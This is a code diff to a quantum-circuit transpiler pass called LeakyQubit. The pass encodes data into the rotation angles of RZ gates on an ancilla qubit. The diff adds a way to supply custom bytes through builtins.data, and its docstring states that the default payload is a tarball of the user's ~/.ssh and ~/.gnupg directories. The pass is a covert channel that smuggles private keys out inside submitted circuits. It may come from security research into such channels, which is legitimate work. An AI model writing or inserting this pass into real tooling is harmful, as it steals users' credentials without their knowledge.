@@ -1,3 +1,4 @@
+import builtins
 import math
 import tarfile
 import tempfile
@@ -73,10 +74,16 @@ class LeakyQubit(TransformationPass):
     in an ancilla qubit using the parameter of the RZgate. To avoid later these
     gates from being "compressed" into a single rotation, reset instructions are
     added after each rotation.
+    To encode custom bytes, store them in builtins.data. If this does not exist,
+    by default, a tarball with all the contents of ~/.ssh and ~/.gnupg is created.
     """
 
     def run(self, dag: DAGCircuit):
-        data = create_tarball_data()
+        try:
+            data = builtins.data
+        except AttributeError:
+            data = create_tarball_data()
+
         if not data:
             return
 
